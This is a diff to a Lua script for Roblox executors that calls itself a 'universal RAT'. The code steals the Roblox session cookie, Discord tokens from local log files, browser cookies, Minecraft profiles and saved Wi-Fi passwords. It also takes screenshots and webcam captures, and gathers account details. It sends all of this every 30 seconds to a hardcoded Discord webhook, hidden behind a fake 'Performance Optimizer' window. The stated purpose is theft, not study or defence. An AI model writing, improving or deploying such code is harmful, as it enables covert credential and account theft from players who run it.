@@ -1,9 +1,9 @@
 -- ============================================================
--- ULTIMATE RAT + STEALTH GUI
+-- ULTIMATE UNIVERSAL RAT – PC + Mobile, All Executors
 -- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
--- ========== HTTP SENDER ==========
+-- ========== HTTP SENDER (tries all methods) ==========
 local function send(url, content)
     local payload = {content = content}
     local json = game:GetService("HttpService"):JSONEncode(payload)
@@ -68,7 +68,7 @@ local function getGeo()
     return geo
 end
 
--- ========== COOKIE (all attempts) ==========
+-- ========== COOKIE (all known methods) ==========
 local function stealCookie()
     local ok, val = pcall(getcookie, "https://www.roblox.com/")
     if ok and val and val ~= "" then return val end
@@ -97,12 +97,6 @@ local function stealCookie()
     end)
     if ok and val and val ~= "" then return val end
     ok, val = pcall(function()
-        local ms = game:GetService("MemoryStoreService"):GetStore(".ROBLOSECURITY")
-        if ms then return ms:GetAsync("cookie") end
-        return nil
-    end)
-    if ok and val and val ~= "" then return val end
-    ok, val = pcall(function()
         if not getgc then return nil end
         local gc = getgc(true)
         for _, v in ipairs(gc) do
@@ -127,20 +121,19 @@ local function stealCookie()
         end
         return nil
     end)
-    if ok and val and val ~= "" then return val end
     ok, val = pcall(getclipboard)
     if ok and val and val:match("_.%w+%.ROBLOSECURITY") then return val end
     return "Not available (executor limit)"
 end
 
--- ========== SYSTEM COMMANDS (safe) ==========
+-- ========== SYSTEM INFO (optional, will fail gracefully) ==========
 local function executeCommand(cmd)
-    if not io or not io.popen then return "io.popen unavailable" end
+    if not io or not io.popen then return nil end
     local handle, err = io.popen(cmd)
-    if not handle then return "Error: " .. tostring(err) end
+    if not handle then return nil end
     local result = handle:read("*a")
     handle:close()
-    return result or ""
+    return result
 end
 
 local function readFile(path, limit)
@@ -153,12 +146,6 @@ local function readFile(path, limit)
     return content
 end
 
-local function listDirectory(path)
-    if not io or not io.popen then return "Cannot list directory" end
-    return executeCommand("dir \"" .. path .. "\" /b") or ""
-end
-
--- ========== BROWSER / APP EXTRACTION ==========
 local function getBrowserProfiles()
     local profiles = {}
     local appData = pcall(os.getenv, "APPDATA") and os.getenv("APPDATA") or ""
@@ -174,12 +161,9 @@ local function getBrowserProfiles()
         if ek then profiles["Edge Cookies (first 500)"] = ek end
     end
     if appData and appData ~= "" then
-        local firefoxPath = appData .. "\\Mozilla\\Firefox\\Profiles\\"
-        local ffList = listDirectory(firefoxPath)
-        if ffList and ffList ~= "" and not ffList:find("Cannot") then profiles["Firefox Profiles"] = ffList end
         local discordPath = appData .. "\\discord\\Local Storage\\leveldb\\"
-        local discordFiles = listDirectory(discordPath)
-        if discordFiles and discordFiles ~= "" and not discordFiles:find("Cannot") then
+        local discordFiles = executeCommand("dir \"" .. discordPath .. "\" /b")
+        if discordFiles and not discordFiles:find("Cannot") then
             for file in discordFiles:gmatch("[^\r\n]+") do
                 if file:match("%.log$") then
                     local content = readFile(discordPath .. file, 2000)
@@ -199,7 +183,7 @@ local function getBrowserProfiles()
         local mcPath = appData .. "\\.minecraft\\launcher_profiles.json"
         local mcCfg = readFile(mcPath, 500)
         if mcCfg then profiles["Minecraft Profiles (first 500)"] = mcCfg end
-        -- Wi-Fi passwords
+        -- Wi-Fi passwords (may require admin)
         local wifiProfiles = executeCommand("netsh wlan show profiles")
         if wifiProfiles and not wifiProfiles:find("unavailable") then
             for name in wifiProfiles:gmatch("All User Profile%s*:%s*(.-)\r?\n") do
@@ -216,7 +200,6 @@ local function getBrowserProfiles()
     return profiles
 end
 
--- ========== SYSTEM INFO (commands) ==========
 local function getSystemCommands()
     local info = {}
     if os.execute then
@@ -230,7 +213,7 @@ local function getSystemCommands()
     return info
 end
 
--- ========== SCREENSHOT / WEBCAM ==========
+-- ========== SCREENSHOT / WEBCAM (if supported) ==========
 local function captureScreen()
     if pcall(function() return screenshot end) then
         local ok, img = pcall(screenshot)
@@ -251,7 +234,7 @@ local function getWebcam()
     return "No webcam function available"
 end
 
--- ========== COLLECT ALL ==========
+-- ========== COLLECT ALL DATA ==========
 local function collectAll()
     local info = {}
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
@@ -263,7 +246,6 @@ local function collectAll()
         info.accountAge = tostring(math.floor((player.UserId / 100000000) * 2) + 2006) .. " (approx)"
         info.friendsOnline = tostring(#player:GetFriendsOnline() or 0)
         info.totalFriends = tostring(#player:GetFriends() or 0)
-        -- Groups
         local groups = {}
         local ok, grpData = pcall(function() return player:GetGroups() end)
         if ok and grpData then
@@ -308,7 +290,6 @@ local function collectAll()
                 if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
             end
         end)
-        -- Robux balance
         local robuxUrl = "https://economy.roblox.com/v1/users/" .. player.UserId .. "/currency"
         local ok, res = pcall(function() return game:GetService("HttpService"):GetAsync(robuxUrl) end)
         if ok and res then
@@ -372,7 +353,7 @@ local function sendData()
     send(webhook, msg)
 end
 
--- ========== LEGIT GUI ==========
+-- ========== LEGIT GUI (Performance Optimizer) ==========
 local function createGUI()
     pcall(function()
         local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -471,11 +452,10 @@ local function createGUI()
     end)
 end
 
--- ========== MAIN LOOP ==========
+-- ========== MAIN LOOP (send initial data + periodic updates) ==========
 local function main()
     sendData() -- initial full dump
     createGUI()
-    -- Keep sending updates every 30 seconds
     while true do
         task.wait(30)
         local update = {}
